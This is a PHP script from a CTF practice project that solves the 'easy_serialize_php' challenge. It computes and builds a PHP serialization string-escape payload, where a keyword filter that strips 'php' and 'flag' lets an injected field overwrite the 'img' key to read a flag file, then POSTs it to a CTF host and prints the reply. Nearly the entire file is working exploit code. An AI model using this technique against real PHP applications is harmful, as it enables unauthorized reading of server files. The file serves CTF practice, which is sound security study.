<?php

/*
 * File: easy_serialize_php.php
 * Project: ctf_Practice
 * Author: tushan <tushanfirm@foxmail.com>
 * Created: 2026-09-10 16:57:46
 *
 * Copyright (c) 2026 tushanfirm
 * All rights reserved.
 */
$_SESSION1 = [];
$_SESSION1["user"] = "guest";
$_SESSION1["function"] = "show_image";
$base_img = base64_encode("/d0g3_fllllllag");
$_SESSION1["img"] = $base_img;
$s1 = serialize($_SESSION1);
echo "预期序列化后:\n";
echo $s1 . "\n";
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 序列化计算位数22位 ;s:8:"function";s:10: (21+1) ;22=16+6
$user = "phpphpflagflagflagflag"; // 22位替代
// 补充img ;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==
// 补充任意第3个元素
$function = ";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";s:1:\"f\";s:1:\"a\";}";
$img = "1";
$_SESSION2["user"] = $user;
$_SESSION2["function"] = $function;
$s2 = serialize($_SESSION2);

function filter($img)
{
    $filter_arr = ["php", "flag", "php5", "php4", "fl1g"];
    $filter = "/" . implode("|", $filter_arr) . "/i";
    return preg_replace($filter, "", $img);
}

$serialize_info = filter($s2);

echo "构造的payload: \n" . $s2 . "\n";
echo "过滤后的: \n" . $serialize_info . "\n";

// ============ 直接发包（无需curl扩展）============
$url = "http://21ee9688bcfdeea6dcd46ff4.http-ctf2.dasctf.com/?f=show_image";

$context = stream_context_create([
    "http" => [
        "method" => "POST",
        "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
        "content" => http_build_query([
            "_SESSION[user]" => $user,
            "_SESSION[function]" => $function,
        ]), // 自动正确编码
        "ignore_errors" => true, // 4xx/5xx也读取响应内容
    ],
]);

$resp = file_get_contents($url, false, $context);
// print $context;
echo "=== 服务器响应 ===\n" . $resp . "\n";
